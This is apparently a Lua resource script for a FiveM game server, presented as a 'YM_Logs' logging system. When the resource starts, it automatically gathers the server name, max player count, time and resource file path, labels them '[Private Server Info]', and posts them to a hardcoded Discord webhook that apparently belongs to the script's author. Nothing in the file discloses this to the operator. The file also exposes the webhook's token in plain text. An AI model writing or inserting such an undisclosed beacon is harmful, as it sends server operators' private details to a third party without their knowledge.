local YM_System = "https://discordapp.com/api/webhooks/716206916476338176/UZun8U1_wX18NsuBB0qZwgsL2SxP6GxN-1U10lKJHNMtV0KS3u85nPnCRhtuoUnwIyst"
local msg = "**@everyone YM_logs is in use**"
local systemtime = os.date("%Y/%m/%d %X")
AddEventHandler("onServerResourceStart", function(resource)
    if GetCurrentResourceName() == resource then
        local ServerName = GetConvar("sv_hostname")
        local client = GetConvar("sv_maxclients")
        local scriptOn = msg ..' **\n\nServer Name : ** ```' .. ServerName .. ' YM_Logs is in use ```  ** \n\n** **[Private Server Info]** \n ** Max Players :** ```' ..client.. '```\n\n  **time :  **\n```'.. systemtime ..  '```\n\n**Resource File :  ** ```\n'  ..GetResourcePath(GetCurrentResourceName()).. '``` \n ```System By Yrahmial```'
        PerformHttpRequest(YM_System, function(err, text, headers) end, 'POST', json.encode({username = "YM_Logs | System", content = scriptOn}), { ['Content-Type'] = 'application/json' })
    end
end)
